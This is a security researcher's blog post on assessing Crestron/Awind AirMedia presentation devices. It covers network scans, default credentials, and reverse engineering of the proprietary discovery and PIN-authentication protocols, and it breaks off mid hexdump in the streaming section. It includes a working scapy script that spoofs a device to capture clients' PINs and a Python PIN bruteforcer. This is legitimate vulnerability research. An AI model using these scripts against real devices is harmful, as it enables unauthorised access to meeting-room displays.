---
layout: post
title:  "Man-in-the-Conference-Room - Part III (Network Assessment)"
date:   2019-03-26 03:00:00
comments: true
categories: pentesting
---

In this third installation of my blog series about wireless presentation devices, I’ll focus on how to discover exposed network services and how to reverse engineer proprietary network protocols. We'll rely on information gained during the two previous posts to do so. You can find those posts there:

* [Man-in-the-conference room - Part I (Introduction)]({{site.url}}/pentesting/2019/03/25/awind-device/)
* [Man-in-the-conference room - Part II (Hardware Hacking)]({{asset.url}}/pentesting/2019/03/25/awind-device-hardware/)

## 1. Network Scan

One of the easiest way to perform a network scan without any interference is to get your own machine to act as a gateway and connect the device under test to it.

I've been using the following bash script for a while now, it follows those 4 simple steps:

1. Create a DHCP server config with a /24 subnet
2. Bring up the interface to which the device is connected
3. Apply iptables rules to NAT traffic to the outside world
4. Launch DHCP server

<details>
<summary style="background-color:#f6f7f8;padding: 5px;border-color:gray;border-style: solid;border-width: 1px;">gw_up.sh</summary>
{% highlight bash %}
#!/bin/bash
IF_IN="eth0"
IF_OUT="wlan0"
SUB="192.168.100"

echo "[+] Creating DHCP server config."
cat <<EOF > /etc/dhcp/dhcp.${IF_IN}.conf
option routers ${SUB}.1;
option domain-name-servers ${SUB}.1;
default-lease-time 14440;
ddns-update-style none;
deny bootp;
shared-network intranet {
    subnet ${SUB}.0 netmask 255.255.255.0 {
        option subnet-mask 255.255.255.0;
        pool { range ${SUB}.2 ${SUB}.5; }
    }
}
EOF

echo "[+] Bringing up interface ${IF_IN}"
ip link set dev ${IF_IN} up
ip addr add ${SUB}.1/24 dev ${IF_IN}
sleep 2

echo "[+] Setting up iptable rules"
modprobe iptable_nat
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s ${SUB}.0/24 -j MASQUERADE
iptables -A FORWARD -o ${IF_IN} -i ${IF_OUT} -s ${SUB}.0/24 -m conntrack --ctstate NEW -j ACCEPT
iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

echo "[+] Launching DHCP service"
dhcpd -cf /etc/dhcp/dhcp.${IF_IN}.conf ${IF_IN}
echo "[+] Done"
{% endhighlight %}
</details>

This one simply brings everything down:

<details>
<summary style="background-color:#f6f7f8;padding: 5px;border-color:gray;border-style: solid;border-width: 1px;">gw_down.sh</summary>
{% highlight bash %}
#!/bin/bash
IF_IN="eth0"
IF_OUT="wlan0"
SUB="192.168.100"

echo "[+] Bringing interface ${IF_IN} down"
ip addr del ${SUB}.1/24 dev ${IF_IN}
ip link set dev ${IF_IN} down

echo "[+] Removing iptable rules"
iptables -t nat -D POSTROUTING -s ${SUB}.0/24 -j MASQUERADE
iptables -D FORWARD -o ${IF_IN} -i ${IF_OUT} -s ${SUB}.0/24 -m conntrack --ctstate NEW -j ACCEPT
iptables -D FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

echo "[+] Stopping DHCP server"
killall dhcpd

echo "[+] Done"
{% endhighlight %}
</details>


### 1.1 IPv6 support ?

<!-- Intro: check IPv4 and IPv6 support -->
One point that is often overlooked is whether the device supports IPv6 or not. This is important because some devices will support IPv6 but only use **iptables** for firewalling and leave things opened given that they forgot about **ip6tables**. One of the easiest way to check for IPv6 support externally is to try to reach the device's IPv6 [link-local address](https://en.wikipedia.org/wiki/Link-local_address).

Link-local addresses in IPv6 are derived from the device's MAC address, so let's find it using **arp**:

<pre>
$ arp
Address                  HWtype  HWaddress           Flags Mask            Iface
192.168.100.2            ether   00:12:5f:16:30:9f   C                     eth0
</pre>

Once you have it you can easily derive the link-local address using a bash script like this one:

```bash
#!/bin/bash

mac_to_ipv6 () {
    IFS=':'; set $1; unset IFS
    ipv6_address="fe80::$(printf %02x $((0x$1 ^ 2)))$2:${3}ff:fe$4:$5$6"
    echo $ipv6_address
}
mac_to_ipv6 $1
```

<pre>
$ mac_to_ipv6.sh 00:12:5f:16:30:9f
fe80::0212:5fff:fe16:309f
</pre>

Now that we have the address, we can try to ping it with **ping6**. Note that you need to mention the interface to which the device is connected at the end of the address if you didn't set explicit routing with '**ip -6 route**'.

<pre>
$ ping6 -c 5 fe80::0212:5fff:fe16:309f%eth0
PING fe80::0212:5fff:fe16:309f%eth0(fe80::212:5fff:fe16:309f) 56 data bytes
From fe80::36e6:d7ff:fe01:3471 icmp_seq=1 Destination unreachable: Address unreachable
From fe80::36e6:d7ff:fe01:3471 icmp_seq=2 Destination unreachable: Address unreachable
From fe80::36e6:d7ff:fe01:3471 icmp_seq=3 Destination unreachable: Address unreachable
From fe80::36e6:d7ff:fe01:3471 icmp_seq=4 Destination unreachable: Address unreachable
From fe80::36e6:d7ff:fe01:3471 icmp_seq=5 Destination unreachable: Address unreachable

--- fe80::0212:5fff:fe16:309f%eth0 ping statistics ---
5 packets transmitted, 0 received, +5 errors, 100% packet loss, time 3999ms
</pre>

We see the address is unreachable, which likely means the device does not support IPv6. Note: this hypothesis was later confirmed in my tests.

### 1.2 TCP Scan (IPv4)

We know the device only supports IPv4 so let's scan the address it got from our DHCP server with Nmap and see what's open. We'll start with a full TCP scan with service fingerprinting enabled, no ping, no DNS resolution:

<pre>
$ nmap -sV -p- -Pn -n -T4 192.168.100.2
Nmap scan report for 192.168.100.2
Host is up, received arp-response (0.00050s latency).
Not shown: 65526 closed ports
Reason: 65526 resets
PORT      STATE SERVICE          REASON         VERSION
<p style="border:#00BCD4 solid 1px">80/tcp    open  http             syn-ack ttl 64 lighttpd 1.4.37</p>
<p style="border:#FFEB3B solid 1px">389/tcp   open  ldap?            syn-ack ttl 64 → scdecapp (association)</p>
<p style="border:#00BCD4 solid 1px">443/tcp   open  ssl/http         syn-ack ttl 64  lighttpd 1.4.37</p>
<p style="border:#4CAF50 solid 1px">515/tcp   open  printer?         syn-ack ttl 64 → scdecapp (streaming)</p>
<p style="border:pink solid 1px">7000/tcp  open  afs3-fileserver? syn-ack ttl 64 → AirplayService</p>
<p style="border:#FFEB3B solid 1px">8080/tcp  open  http-proxy?      syn-ack ttl 64 → scdecapp (association)
19996/tcp open  unknown          syn-ack ttl 64 → scdecapp (association) </p>
<p style="border:#4CAF50 solid 1px">31865/tcp open  unknown          syn-ack ttl 64 → scdecapp (streaming)</p>
<p style="border:pink solid 1px">49153/tcp open  rtsp             syn-ack ttl 64 → AirplayService</p>
</pre>

Service description beginning with an arrow are manual addition as they are not recognized by Nmap.

The device is exposing three main kind services:

1. a lighttpd server hosting the web GUI
2. an [Airplay](https://en.wikipedia.org/wiki/AirPlay) service
3. custom services listening on multiple ports, named "scdecapp" based on initial firmware analysis.

#### HTTP Web GUI (lighttpd)

The web GUI is not unusual. A lighttpd server with CGI scripts behind. This is what the interface looks like:

![awind_webgui]({{site.url}}/assets/awind_webgui.png)

Note that two users with default credentials are set: admin/admin and moderator/moderator.

#### AirplayService

The exposure of this service breaks the Airmedia protocol purpose. The whole idea behind that proprietary protocol is that a user must enter a PIN code to be able to stream content. Given that by default Airplay does not force users to authenticate, anyone can stream arbitrary content to the device, thus bypassing Airmedia custom protocol.

This can be demonstrated using any open implementation of Airplay such as [open-airplay](https://github.com/jamesdlow/open-airplay):

<pre>
$ git clone https://github.com/jamesdlow/open-airplay.git
$ cd open-airplay/Java && ant
$ java -jar build/airplay.jar -h 192.168.100.2 -p /tmp/this_is_fine.jpg
</pre>


#### Awind Protocol (scdecapp)

This is a proprietary protocol developped by Awind (OEM provider of Crestron). It takes care of discovery, association, and streaming of content. We will reverse engineer it in the [next section](#protocol_re).


### 1.3 UDP Scan (IPv4)

Now that we've covered TCP, let's move to UDP ! As we can see in the excerpt below, the device exposes three services: [NetBIOS](https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP), [SNMP](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol), and [mDNS](https://en.wikipedia.org/wiki/Multicast_DNS):

<pre>
$ nmap -sUV -p- -T4 -Pn -n 192.168.100.2
Nmap scan report for 192.168.100.2
Host is up, received arp-response (0.00054s latency).
Reason: 981 port-unreaches
PORT      STATE         SERVICE         REASON               VERSION
137/udp   open          netbios-ns      udp-response ttl 64  Microsoft Windows XP netbios-ssn
161/udp   open          snmp            udp-response ttl 64  SNMPv1 server; Crestron Electronics, Inc. SNMPv3 server (public)
5353/udp  open          mdns            udp-response ttl 255 DNS-based service discovery
</pre>

#### NetBIOS

You can confirm NetBIOS exposure using *nbtscan*. I still can't wrap my head around why they would need to expose such service, but yet it is there.

<pre>
$ nbtscan 192.168.100.2
Doing NBT name scan for addresses from 192.168.100.2
IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
192.168.100.2    AIRMEDIA-16309F  server  AIRMEDIA-16309F  00:00:00:00:00:00
</pre>

#### SNMP

Out of the box, the device exposes SNMP version 1 and version 2c using default read and write communities (public, private). The best way to interact with it is to use *snmpget*, *snmpset*, and *snmpwalk* utilities:

<pre>
$ snmpwalk -c public -v1 192.168.100.2
SNMPv2-MIB::sysDescr.0 = STRING: Crestron Electronics AM-100 (Version 2.4.1.19)
--snip--
</pre>

#### mDNS

To check services advertised over multicast DNS, nothing better than Metasploit `auxiliary/scanner/mdns/query` module:

<pre>
msf5 > use auxiliary/scanner/mdns/query
msf5 auxiliary(<span style="color:#F44336">scanner/mdns/query</span>) > run

<span style="color:#2196F3">[*]</span> Sending mDNS PTR IN queries for _services._dns-sd._udp.local to 192.168.100.2->192.168.100.2 port 5353 (1 hosts)
<span style="color:#4CAF50">[+]</span> 192.168.100.2 responded with _services._dns-sd._udp.local: (PTR _raop._tcp.local, PTR _airplay._tcp.local)
<span style="color:#2196F3">[*]</span> Scanned 1 of 1 hosts (100% complete)
<span style="color:#2196F3">[*]</span> Auxiliary module execution completed
</pre>

Looking on the wire we can see the device advertising as an "Apple TV version 3.2":

<pre>
11:22:19.640419 IP 192.168.100.2.mdns > 224.0.0.251.mdns: 0*- [0q] 7/0/0 PTR 00125F1799DF@AirMedia-16309f._raop._tcp.local., (Cache flush) TXT "txtvers=1" "cn=0,1,2,3" "da=true" "et=0,3,5" "ft=0x5A7FFFF7,0xE" "md=0,1,2" "sv=false" "sr=44100" "ss=16" "pw=1" "vn=65537" "tp=UDP" "vs=220.68" <span style="background-color:#FFEB3B;color:black">"am=AppleTV3,2"</span> "pk=7af87b1bda1782678d48ca3494defe037a7da5a2e358c74dda9f04706694e88d" "sf=0x44" "vv=2", (Cache flush) SRV Crestron.local.:49153 0 0, (Cache flush) A 192.168.100.2, PTR AirMedia-16309f._airplay._tcp.local., (Cache flush) TXT "deviceid=00:12:5f:16:30:9f" "srcvers=220.68" "features=0x5A7FFFF7,0xE" "pw=1" "flags=0x44" "model=AppleTV3,2" "pk=7af87b1bda1782678d48ca3494defe037a7da5a2e358c74dda9f04706694e88d" "vv=2", (Cache flush) SRV Crestron.local.:7000 0 0 (586)
</pre>

Now that we have a pretty good understanding of what's running on the device network-wise, it's time to reverse engineer this unknown protocol we've come accross during our TCP scan. Time to perform some traffic analysis !

<span id="protocol_re" ></span>

## 2. Trafic Analysis & Protocol Reverse Engineering

There are many ways to capture traffic for analysis while testing embedded devices. You could use a switch with a SPAN port, connect it directly like I did in the previous section, wait to get a shell and use tcpdump locally, ...

We'll use a more straightforward method that does not involve buying a switch or getting a shell: transparent bridges with [*brctl*](https://linux.die.net/man/8/brctl). The bash script below should help you get started with transparent bridges on Linux:

```bash
#!/bin/bash
IF_IN="eth0"
IF_OUT="eth1"
BR="br0"
ip link set dev $IF_IN up  # bring first leg up
ip link set dev $IF_OUT up # bring second leg up
brctl addbr $BR  # create bridge interface
brctl addif $BR $IF_IN # join first leg to bridge
brctl addif $BR $IF_OUT # join second leg to bridge
ip link set dev $BR up # bring bridge interface up
```

Connect the tested device on one interface and the second interface to your switch/router. Once your bridge interface is up you can start capturing traffic flowing through it with [*Wireshark*](https://www.wireshark.org/).


### 2.1 Discovery Protocol

To discover Airmedia devices connected to the same subnet, client applications (Windows, iOS, Android) send a UDP packet on port 1047 to the broadcast address of their subnet with a payload set to `WPPS`. Upon reception, the Airmedia device reply with a UDP packet to port 1047 on the client.

You can see the request/response in *tcpdump* output below (I removed IP layer from the output so it's easier to understand). The response packet always contains <span style="background-color:#00BCD4;color:white">AWPP</span>, the <span style="background-color:#E91E63;color:white">device's name</span>, <span style="background-color:#009688;color:white">make</span>, <span style="background-color:#FF9800;color:white">model</span>, <span style="background-color:#673AB7;color:white">firmware version</span>, and some fixed values. The firmware version is made of four hex bytes that needs to be interpreted as integer (i.e. firmware version is 2.4.1.13 here).

<pre>
tcpdump: listening on eth14, link-type EN10MB (Ethernet), capture size 262144 bytes

192.168.100.1.<span style="background-color:#FFEB3B;color:black">1047</span> > 192.168.100.255.<span style="background-color:#FFEB3B;color:black">1047</span>: [udp sum ok] UDP, length 4
0x0000:  4500 0020 0001 0000 4011 307b c0a8 6401  E.......@.0{..d.
0x0010:  c0a8 64ff 0417 0417 000c 05b3 <span style="background-color:#00BCD4;color:black">5750 5053</span>  ..d.........<span style="background-color:#00BCD4;color:black">WPPS</span>

192.168.100.2.<span style="background-color:#FFEB3B;color:black">1047</span> > 192.168.100.1.<span style="background-color:#FFEB3B;color:black">1047</span>: [udp sum ok] UDP, length 128
0x0000:  4500 009c 0000 4000 4011 f0cc c0a8 6432  E.....@.@.....d2
0x0010:  c0a8 6401 0417 0417 0088 acf0 <span style="background-color:#00BCD4;color:black">4157 5050</span>  ..d.........<span style="background-color:#00BCD4;color:black">AWPP</span>
0x0020:  c0a8 6402 01bb 7c79 0411 270c <span style="background-color:white;color:black">4169 724d</span>  ..d...|y..'.<span style="background-color:#E91E63;color:white">AirM</span>
0x0030:  <span style="background-color:#E91E63;color:white">6564 6961 2d31 3633 3039 66</span>00 0000 0000  <span style="background-color:#E91E63;color:white">edia-16309f</span>.....'
0x0040:  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x0050:  0000 0000 <span style="background-color:#009688;color:white">4372 6573 7472 6f31 3030 3131</span>  ....<span style="background-color:#009688;color:white">Crestro10011</span>
0x0060:  <span style="background-color:#009688;color:white">3131 3031 3131 3030 3031</span> 0221 0000 0000  <span style="background-color:#009688;color:white">1101110001</span>.!....
0x0070:  0000 0000 012d 0000 0000 0000 0000 <span style="background-color:#FF9800;color:white">5769</span>  .....-........<span style="background-color:#FF9800;color:white">Wi</span>
0x0080:  <span style="background-color:#FF9800;color:white">5047 314b 3573</span> 0000 0000 0000 0000 <span style="background-color:#673AB7;color:white">0204</span>  <span style="background-color:#FF9800;color:white">PG1K5s</span>........<span style="background-color:#673AB7;color:white">..</span>
0x0090:  <span style="background-color:#673AB7;color:white">0113</span> 0405 3000 0000 0000 0000            <span style="background-color:#673AB7;color:white">....</span>0.......
</pre>

We can emulate that exchange using a Lua script and Nmap. The script simply sends discovery packets and monitor the interface for replies. If valid replies are observed, device information is displayed.

<!-- <script src="https://gist.github.com/QKaiser/be432183d36efde5d2076619aeb872cb.js"></script> -->

<details>
<summary style="background-color:#f6f7f8;padding: 5px;border-color:gray;border-style: solid;border-width: 1px;">broadcast-awind-discover.nse</summary>
{% highlight lua %}
local nmap = require "nmap"
local packet = require "packet"
local stdnse = require "stdnse"
local target = require "target"

description = [[
Discovers Awind wireless presentation devices and derivatives using the same
method as the manufacturers own client applications. An interface needs to be
configured, as the script broadcasts a UDP packet.

The script needs to be run as a privileged user, typically root.

References:
* https://qkaiser.github.io/pentesting/2019/03/26/awind-device-network/
]]

---
-- @usage
-- nmap -e eth0 --script broadcast-awind-discover
--
-- @output
-- | broadcast-awind-discover:
-- |   192.168.1.2:
-- |     Hostname: Airmedia1
-- |     Make: Crestro100111101110001
-- |     Model: WiPG1K5s
-- |     Version: 2.6.0.6
-- |   192.168.1.3:
-- |     Hostname: WiPG-1000
-- |     Make: awind111111101110111
-- |     Model: WiPG2KS
-- |_    Version: 2.0.0.3
--
-- @args broadcast-awind-discover.timeout time in seconds to wait for a response
--       (default: 1s)

author = "Quentin Kaiser"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"broadcast", "safe"}


-- preliminary checks
local interface = stdnse.get_script_args(SCRIPT_NAME .. ".interface") or nmap.get_interface()

prerule = function()
  if not nmap.is_privileged() then
    stdnse.verbose1("Not running for lack of privileges.")
    return false
  end

  local has_interface = ( interface ~= nil )
  if ( not(has_interface) ) then
    stdnse.verbose1("No network interface was supplied, aborting.")
    return false
  end
  return true
end

action = function(host, port)
  local sock, co
  sock = nmap.new_socket()

  local timeout = stdnse.parse_timespec(stdnse.get_script_args(SCRIPT_NAME .. ".timeout"))
  timeout = (timeout or 1) * 1000

  -- listen for a response
  sock:set_timeout(timeout)
  sock:pcap_open(interface, 1500, false, "ip && udp && port 1047 && greater 64")
  send_discover()
  local start_time = nmap.clock_ms()
  local results = stdnse.output_table()
  while( nmap.clock_ms() - start_time < timeout ) do
    local status, plen, _, layer3 = sock:pcap_receive()

    if ( status ) then
      local p = packet.Packet:new( layer3, #layer3)

      if ( p and p.udp_dport ) then
        -- parsing the result
        local IP = p.ip_src
        payload = stdnse.tohex(layer3)
        x, y = payload:find("41575050") -- AWPP
        idx = y + 25
        curr_idx = idx

        while payload:sub(curr_idx, curr_idx+1) ~= "00" do
            curr_idx = curr_idx + 2
        end
        local Hostname = stdnse.fromhex(payload:sub(idx, curr_idx-1))

        -- skip garbage
        while payload:sub(curr_idx, curr_idx+1) == "00" do
            curr_idx = curr_idx + 2
        end
        idx = curr_idx

        -- parse make
        while payload:sub(curr_idx, curr_idx+1) ~= "00" do
            curr_idx = curr_idx + 2
        end

        local Make = stdnse.fromhex(payload:sub(idx, curr_idx-1))

        -- skip garbage
        while payload:sub(curr_idx, curr_idx+1) == "00" do
            curr_idx = curr_idx + 2
        end
        curr_idx = curr_idx + 20
        while payload:sub(curr_idx, curr_idx+1) == "00" do
            curr_idx = curr_idx + 2
        end
        idx = curr_idx

        -- parse model
        while payload:sub(curr_idx, curr_idx+1) ~= "00" do
            curr_idx = curr_idx + 2
        end
        local Model = stdnse.fromhex(payload:sub(idx, curr_idx-1))

        -- skip garbage
        idx = idx + 32

        -- parse firmware version number
        local Version = tonumber(payload:sub(idx, idx+1)) .. "." .. tonumber(payload:sub(idx+2, idx+3)) .. "." .. tonumber(payload:sub(idx+4, idx+5)) .. "." .. tonumber(payload:sub(idx+6, idx+7))

        -- add nodes
        if target.ALLOW_NEW_TARGETS then
          target.add(IP)
        end

        local output = stdnse.output_table()
        output['Hostname'] = Hostname
        output['Make'] = Make
        output['Model'] = Model
        output['Version'] = Version
        results[IP] = output
      end
    end
  end
  sock:close()

  if #results > 0 then
    return results
  end
end

function send_discover()
  local host="255.255.255.255"
  local port="1047"
  local socket = nmap.new_socket("udp")

  local status = socket:sendto(host, port, "WPPS")
  if not status then return end
  socket:close()

  return true
end

{% endhighlight %}
</details>

Running the script will give you this:
<pre>
# nmap --script broadcast-awind-discover -e eth0
Starting Nmap 7.70SVN ( https://nmap.org ) at 2018-09-29 21:49 CEST
Pre-scan script results:
| broadcast-awind-discover:
|   192.168.100.2:
|     Hostname: AirMedia-16309f
|     Make: Crestro100111101110001\x02a
|     Model: WiPG1K5s
|_    Version: 2.6.0.6
WARNING: No targets were specified, so 0 hosts scanned.
Nmap done: 0 IP addresses (0 hosts up) scanned in 1.63 seconds
</pre>


Of course, we can also simulate an Airmedia device by replying to discovery requests sent by legitimate clients:

{% highlight python %}
#!/usr/bin/env python
from scapy.all import *

payload = "AWPP\xc0\xa8d2\x01\xbb|y\x04\x11'\x0cEvilHacker799df\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x00Crestro100111101110001\x02!\x00\x00\x00" \
"\x00\x00\x00\x00\x00\x01-\x00\x00\x00\x00\x00\x00\x00\x00WiPG1K5s" \
"\x00\x00\x00\x00\x00\x00\x00\x00\x02\x04\x01\x13\x04\x050\x00\x00" \
"\x00\x00\x00\x00\x00"

def pkt_callback(pkt):
    if pkt[IP].dst[-3:] == "255" and pkt[UDP].dport==1049 \
        and pkt[Raw].load=="WPPS":
        print pkt[IP].src
        send(IP(dst=pkt[IP].src)/UDP(sport=1047, dport=1047)/payload)
sniff(prn=pkt_callback, filter="udp", store=0)
{% endhighlight %}

This could be used by an attacker to force a client to execute the association with its own machine instead of the legitimate Airmedia device and therefore steal the PIN code 😈.


### 2.2 Association/Authentication Protocol

The association between a client application and the Airmedia device is performed over TCP/389 with what seems to be a proprietary protocol.

#### Discovery

The first step is a "ping pong" request to verify availability of the remote device. Client sends `wppaliveROCK` to which the server replies `wppaliveROLL`. It's super easy to check with netcat:

<pre>
$ echo "wppaliveROCK" | nc 192.168.100.2 389
wppaliveROLL
</pre>

This behavior can be exploited with Nmap to reliably fingerprint that service. The rule below can be appended to **nmap-service-probes** file. It defines a TCP probe that will send `wppaliveROCK` to the target port. If Nmap receives a response from the service that match `wppaliveROLL`, this means we successfully identified an Awind association port.

<pre>
Probe TCP awindAssociat q|wppaliveROCK\n|
# rarity 8
ports 389,3268
match awind-associate m|^wppaliveROLL$|s p/Awind scdecapp association/ d/specialized/ cpe:/h:awind/
</pre>

#### Association (0x90)

The second step is similar to what we observed during the broadcast discovery of devices but instead of a broadcast UDP packet, a TCP packet is sent to port 389. That packet holds the command `wppcmd` followed by two null bytes and an opcode: `0x90`.

The device reply to this by sending back the information we already analyzed in the broadcast discovery section: hostname, model, make, and firmware version. That exchange can be triggered with a bit of Python and netcat:

<pre>
$ python -c 'print "wppcmd\x00\x00\x90"' | nc 192.168.100.2 389 | hexdump -C
00000000  <span style="background-color:#00BCD4;color:black">77 70 70 63 6d 64</span> <span style="background-color:white;color:black">00 00  91</span> 41 57 50 50 c0 a8 01  |<span style="background-color:#00BCD4;color:black">wppcmd</span><span style="background-color:white;color:black">...</span>AWPP...|
00000010  13 01 bb 7c 79 04 11 27  0c 41 69 72 4d 65 64 69  |...|y..'.AirMedi|
00000020  61 2d 31 36 33 30 39 66  00 00 00 00 00 00 00 00  |a-16309f........|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000040  00 43 72 65 73 74 72 6f  31 30 30 31 31 31 31 30  |.Crestro10011110|
00000050  31 31 31 30 30 30 31 02  61 00 00 00 00 00 00 00  |1110001.a.......|
00000060  00 01 2d 00 00 00 00 00  00 00 00 57 69 50 47 31  |..-........WiPG1|
00000070  4b 35 73 00 00 00 00 00  00 00 00 02 06 00 06 04  |K5s.............|
00000080  05 30 00 00 00 00 00 00  00                       |.0.......|
00000089
</pre>

We see that the device answers with `wppcmd` followed by two null bytes and the response opcode: `0x91`.

#### Authentication (0x92, 0x93)

The third step is PIN-based authentication. The opcode for authentication is `0x92` and the packet contains the PIN code. In the example below we see a client attempting to login with the wrong PIN (1234), to which the device reply with an authentication response opcode (`0x93`) and a value set to `0x00` meaning authentication failed.

<pre>
00000015  <span style="background-color:#00BCD4;color:black">77 70 70 63 6d 64</span> <span style="background-color:white;color:black">00 00  92</span> 47 47 47 47 47 47 47 <span style="background-color:#00BCD4;color:black">wppcmd</span><span style="background-color:white;color:black">.. .</span>GGGGGGG
00000025  47 27 73 20 69 50 61 64  00 00 00 00 00 00 00 00 G's iPad ........
00000035  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
00000045  00 00 00 00 00 00 00 00  00 c0 a8 0c e4 <span style="background-color:#FFEB3B;color:black">31 32 33</span> ........ .....<span style="background-color:#FFEB3B;color:black">123</span>
00000055  <span style="background-color:#FFEB3B;color:black">34</span> 00 00 00 00 1e 0a 0a  00 01 00 00 02 4a 6e 4d <span style="background-color:#FFEB3B;color:black">4</span>....... .....JnM
00000065  4f 50 53 44 4b 00 00 00  00 00 00 00 00 00 00 00 OPSDK... ........
00000075  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
00000085  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
00000095  00 00 00 00 00 00 00 00  00                      ........ .

00000095  <span style="background-color:#00BCD4;color:black">77 70 70 63 6d 64</span> <span style="background-color:white;color:black">00 00  93</span> <span style="background-color:#F44336;color:black">00</span>                   <span style="background-color:#00BCD4;color:black">wppcmd</span><span style="background-color:white;color:black">.. .</span><span style="background-color:#F44336;color:black">.</span>
</pre>


In the example below we see a client attempting to login with the right PIN 4160, to which the device reply with an authentication response opcode (`0x93`) and a value set to `0x01` meaning authentication successful.

<pre>
00000015  <span style="background-color:#00BCD4;color:black">77 70 70 63 6d 64</span> <span style="background-color:white;color:black">00 00  92</span> 47 47 47 47 47 47 47 <span style="background-color:#00BCD4;color:black">wppcmd</span><span style="background-color:white;color:black">.. .</span>GGGGGGG
00000025  47 27 73 20 69 50 61 64  00 00 00 00 00 00 00 00 G's iPad ........
00000035  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
00000045  00 00 00 00 00 00 00 00  00 c0 a8 0c e4 <span style="background-color:#FFEB3B;color:black">34 31 36</span> ........ .....<span style="background-color:#FFEB3B;color:black">416</span>
00000055  <span style="background-color:#FFEB3B;color:black">30</span> 00 00 00 00 1e 0a 0a  00 01 00 00 02 4a 6e 4d <span style="background-color:#FFEB3B;color:black">0</span>....... .....JnM
00000065  4f 50 53 44 4b 00 00 00  00 00 00 00 00 00 00 00 OPSDK... ........
00000075  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
00000085  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00 ........ ........
00000095  00 00 00 00 00 00 00 00  00                      ........ .

00000095  <span style="background-color:#00BCD4;color:black">77 70 70 63 6d 64</span> <span style="background-color:white;color:black">00 00  93</span> <span style="background-color:#4CAF50;color:black">01</span>                   <span style="background-color:#00BCD4;color:black">wppcmd</span><span style="background-color:white;color:black">.. .</span><span style="background-color:#4CAF50;color:black">.</span>
</pre>


Now that we know how the association protocol works, let's write a PIN bruteforcer !

<details>
<summary style="background-color:#f6f7f8;padding: 5px;border-color:gray;border-style: solid;border-width: 1px;">bruteforce_pin.py</summary>
{% highlight python %}
#!/usr/bin/env python
import socket
import sys

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print "Usage: %s target" % sys.argv[0]
        sys.exit(1)

    target = sys.argv[1]
    print "[+] Establishing connection to %s" % target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, 3268))
        # Discovery
        s.send("wppaliveROCK")
        response = s.recv(2048)
        if response != "wppaliveROLL":
            raise Exception("An error occured during discovery")

        s.send("\x77\x70\x70\x63\x6d\x64\x00\x00\x90")
        response = s.recv(2048)
        print "[+] Connection established with %s (%s)" % (target, response[25:40])

        s.send("wppaliveROCK")
        response = s.recv(2048)
        if response != "wppaliveROLL":
            raise Exception("An error occured during association")

        print "[+] Starting PIN bruteforcing ..."

        # Authentication
        payload = "\x77\x70\x70\x63\x6d\x64\x00\x00\x92\x47\x72\x65\x6d\x77\x65\x6c" \
            "\x6c\x27\x73\x20\x69\x50\x61\x64\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\xa8\x0c\xe4%s" \
        "\x00\x00\x00\x00\x1e\x0a\x0a\x00\x01\x00\x00\x02\x4a\x6e\x4d" \
        "\x4f\x50\x53\x44\x4b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        for i in range(0,10000):
            pin = str(i).zfill(4)
            s.send(payload % pin)
            response = s.recv(2048)
            if response.encode('hex')[-4:] == "9301":
                print "\n[*] PIN code is %s" % pin
                break
            sys.stdout.write('\r')
            sys.stdout.write('[+] PIN checked: %d/%d' % (i, 10000))
            sys.stdout.flush()

    except Exception as e:
        print "[!] %s" % e.message
        s.close()
{% endhighlight %}
</details>

This is what the script running looks like. It's a little bit slow, but it's a single threaded proof-of-concept :)

<script src="https://asciinema.org/a/nk0RGP4nQQjrMxGZ30ihOTLX0.js" id="asciicast-nk0RGP4nQQjrMxGZ30ihOTLX0" async></script>

### 2.3 Streaming Protocol

Streaming is performed over TCP port 31865 by default, but it seems that it can also be performed over other ports such as TCP/515 and TCP/8080.
All those ports reply to NULL probes with `wppib`, this can be observed with netcat:

<pre>
$ echo "" | nc 192.168.100.2 31865 | hexdump -C
00000000  77 70 70 69 62 00 00 10  00 00 00 00              |wppib.......|
0000000c
</pre>

This means that the service can be reliably fingerprinted with Nmap in the same way that we did for the association protocol. This time we edit **nmap-service-probes**
in the section following the NULL probe definition. A NULL probe is simply Nmap connecting to the service and sending an empty payload.

If the response returned by the server matches "wppib", we know it's an Awind streaming receiver:

<pre>
match awind-wppib m|^wppib\0\0\x10\0\0\0\0$| p/Awind scdecapp stream/ d/specialized/ cpe:/h:awind/
</pre>

To see how streaming is performed, I captured multiple streams performed from an Android phone. This is what the exchange looks like:

First, the server answers the client with this wppib:

<pre>
77 70 70 69 62 00 00 10 00 00 00 00        wppib.......
</pre>

Then the client sends this packet:

<pre>
53 65 6e 64 65 72 49 64 02 00 00 00 00 00  SenderId......
00 00 00 00 00 00 00 00 00 00 00 00 00 00  ..............
00 00 00 00                                ....
</pre>


Immediately followed by this:

<pre>
41 57 49 4e 44 49 42 20 04 00 00 00 00 00 00 00  AWINDIB ........
00 00 04 ff 02 cf 00 38 40 00 00 38 47 ce 00 38  .......8@..8G..8
